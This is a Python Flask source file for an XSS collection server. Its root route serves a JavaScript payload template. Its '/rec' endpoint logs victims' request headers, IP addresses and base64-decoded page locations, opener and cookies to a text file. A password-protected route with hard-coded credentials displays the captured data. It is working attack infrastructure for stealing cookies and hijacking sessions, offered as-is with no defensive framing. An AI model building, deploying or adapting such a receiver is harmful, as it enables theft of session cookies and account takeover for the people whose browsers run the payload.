# -*- coding: utf-8 -*-

from flask import Flask
from flask import render_template
from flask import request
from flask_httpauth import HTTPBasicAuth
from werkzeug.security import generate_password_hash, check_password_hash
from base64 import b64decode
import os
import datetime

APP_ROOT = os.path.dirname(os.path.abspath(__file__))
TXT_PATH = os.path.join(APP_ROOT, 'templates')
app = Flask(__name__)
auth = HTTPBasicAuth()
users = [
    {'username': 'fuckxss', 'password': generate_password_hash('fuckxss123')},
]

@auth.verify_password
def verify_password(username, password):
    for user in users:
        if user['username'] == username:
            if check_password_hash(user['password'], password):
                return True
    return False

@app.route('/')
def xss():
    return render_template('default_xss.js')

@app.route('/rec')
def rec():
    x = request.args
    rh = request.headers
    rra = request.remote_addr
    with open(os.path.join(TXT_PATH, 'thotho1212.txt'), 'a+') as f:
        f.write('--------------------------\n')
        f.write(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + '\n')
        for key in rh.keys():
            f.write(key + ': ' + rh[key] + '\n')
        f.write('remote_address: ' + rra + '\n')
        f.write('location: ' + b64decode(x['token'].split('.')[0]).decode('utf-8') + '\n')
        f.write('toplocation: ' + b64decode(x['token'].split('.')[1]).decode('utf-8') + '\n')
        f.write('cookie: ' + b64decode(x['token'].split('.')[2]).decode('utf-8') + '\n')
        f.write('opener: ' + b64decode(x['token'].split('.')[3]).decode('utf-8') + '\n')

    return ''

@app.route('/thotho1212')
@auth.login_required
def thotho():
    try:
        with open(os.path.join(TXT_PATH, 'thotho1212.txt'), 'r+') as f:
            return f.read().replace('\n','</br>')
    except:
        return ''


if __name__ == '__main__':
    app.run(host='0.0.0.0')